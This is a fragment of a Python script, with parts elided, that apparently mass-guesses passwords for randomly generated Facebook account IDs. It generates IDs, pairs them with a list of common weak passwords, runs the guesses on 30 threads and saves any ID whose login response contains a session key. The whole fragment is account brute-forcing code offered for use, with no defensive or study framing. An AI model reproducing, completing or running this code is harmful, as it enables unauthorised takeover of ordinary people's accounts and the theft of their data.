...
def rndm_bd():
        ...
        with tred(max_workers=30) as Tanim:
                ...
                for love in user:
                        ids = code + love 
                        pasx = [love,ids,ids[:8],ids[:7],'102030','009988','908070','১২৩৪৫৬','১২৩৪৫৬৭৮','234567','405060','708090','665544','123412','00998877','778899','345678','908070','100200','135790','567890','first last','first@123','First Last','lastlast']
...
def rndmx(ids,pasx,tl):
        ...
        try:
                for pas in pasx:
                        accees_token = ''
                        ...
                        if 'session_key' in po:
                                ...
                                ok.append(str(uid))
                                break
                        elif 'x.facebook.com' in po['error']['message']: 
